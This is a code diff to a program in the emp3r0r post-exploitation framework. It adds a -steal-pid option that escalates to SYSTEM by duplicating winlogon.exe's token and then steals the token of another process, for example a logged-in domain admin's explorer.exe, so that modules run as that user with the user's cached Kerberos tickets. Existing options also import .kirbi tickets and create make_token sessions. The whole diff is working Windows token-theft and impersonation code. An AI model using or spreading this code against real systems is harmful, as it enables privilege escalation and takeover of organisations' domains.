@@ -28,6 +28,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/priv"
 	"github.com/jm33-m0/emp3r0r/core/lib/script"
 	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"golang.org/x/sys/windows"
 )
 
@@ -37,15 +38,21 @@ func main() {
 
 func run() int {
 	var (
-		scriptPath  = flag.String("script", "", "path to a .star module")
-		arg         = flag.String("arg", "", "argument passed to main(*args) (repeatable: comma-separated)")
-		makeToken   = flag.String("make-token", "", "create a netonly make_token session for this user")
-		domain      = flag.String("domain", ".", "domain for -make-token")
-		password    = flag.String("password", "dummy", "password for -make-token (never validated)")
-		importTkt   = flag.String("import-ticket", "", "path to a .kirbi (or base64) to import into the session")
-		directTest  = flag.String("direct-test", "", "UNC path to exercise with raw FindFirstFileW under 3 impersonation patterns")
+		scriptPath = flag.String("script", "", "path to a .star module")
+		arg        = flag.String("arg", "", "argument passed to main(*args) (repeatable: comma-separated)")
+		makeToken  = flag.String("make-token", "", "create a netonly make_token session for this user")
+		stealPid   = flag.Uint("steal-pid", 0, "steal the token of this local PID (e.g. explorer.exe of a logged-in DA) and run the module under it; alternative to -make-token")
+		domain     = flag.String("domain", ".", "domain for -make-token")
+		password   = flag.String("password", "dummy", "password for -make-token (never validated)")
+		importTkt  = flag.String("import-ticket", "", "path to a .kirbi (or base64) to import into the session")
+		directTest = flag.String("direct-test", "", "UNC path to exercise with raw FindFirstFileW under 3 impersonation patterns")
 	)
 	flag.Parse()
+
+	if *makeToken != "" && *stealPid != 0 {
+		fmt.Fprintln(os.Stderr, "[!] -make-token and -steal-pid are mutually exclusive")
+		return 2
+	}
 
 	if _, err := syscall.GetRuntimeSyscallTable(); err != nil {
 		fmt.Fprintf(os.Stderr, "[!] syscall table: %v\n", err)
@@ -62,7 +69,37 @@ func run() int {
 	}
 
 	var token uintptr
-	if *makeToken != "" {
+	if *stealPid != 0 {
+		// -steal-pid mirrors the agent's steal_token flow: duplicate the
+		// primary token of a local process (e.g. explorer.exe of the logged-in
+		// DA) and run the module under its impersonation token. No ticket is
+		// needed when that logon session already has Kerberos tickets cached.
+		//
+		// Some tokens (e.g. another admin user's interactive session) deny
+		// TOKEN_DUPLICATE even with SeDebugPrivilege; chaining the steal
+		// through a SYSTEM process token (winlogon.exe) first works in every
+		// case.
+		sysPids := util.PidOf("winlogon.exe")
+		if len(sysPids) == 0 {
+			fmt.Fprintln(os.Stderr, "[!] winlogon.exe not found for SYSTEM escalation")
+			return 1
+		}
+		sysTok, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(sysPids[0]))
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[!] steal SYSTEM token from winlogon (pid %d): %v\n", sysPids[0], err)
+			return 1
+		}
+		defer windows.CloseHandle(sysTok)
+
+		hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(*stealPid), sysTok)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[!] steal_token from PID %d (as SYSTEM): %v\n", *stealPid, err)
+			return 1
+		}
+		defer windows.CloseHandle(hToken)
+		token = uintptr(hToken)
+		fmt.Fprintf(os.Stderr, "[*] stolen token from PID %d: %s\n", *stealPid, priv.GetTokenFriendlyName(hToken))
+	} else if *makeToken != "" {
 		session, err := priv.MakeToken(*makeToken, *domain, *password)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[!] make_token: %v\n", err)
